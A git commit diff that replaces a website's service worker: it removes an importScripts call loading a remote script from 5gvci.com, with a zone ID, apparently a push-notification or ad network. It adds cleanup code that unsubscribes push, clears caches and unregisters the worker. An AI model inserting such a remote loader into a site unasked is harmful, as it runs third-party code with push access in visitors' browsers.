026493d44112d7366b67cc63c82201525d6ef610
Yefeng1346 <yef8851@gmail.com>
2026-08-02 15:29:52 +0800

    Prioritize SEO, privacy, and site safety

--- sw.js
+++ sw.js
@@ -1,6 +1,16 @@
-self.options = {
-    "domain": "5gvci.com",
-    "zoneId": 11449373
-}
-self.lary = ""
-importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+self.addEventListener("install", () => self.skipWaiting());
+
+self.addEventListener("activate", (event) => {
+  event.waitUntil((async () => {
+    try {
+      const subscription = await self.registration.pushManager.getSubscription();
+      if (subscription) await subscription.unsubscribe();
+    } catch (_) {
+      // Continue cleanup if an old push subscription cannot be read.
+    }
+
+    const cacheNames = await caches.keys();
+    await Promise.all(cacheNames.map((cacheName) => caches.delete(cacheName)));
+    await self.registration.unregister();
+  })());
+});
